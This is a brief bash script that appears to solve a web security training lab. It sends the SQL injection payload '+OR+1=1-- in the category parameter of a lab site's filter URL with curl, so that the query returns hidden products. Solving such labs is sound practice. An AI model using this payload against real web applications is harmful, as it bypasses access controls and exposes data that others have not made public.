#!/bin/bash
# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

set -e

category="'+OR+1=1--"

curl "https://$LAB_ID.web-security-academy.net/filter?category=$category" -o /dev/null
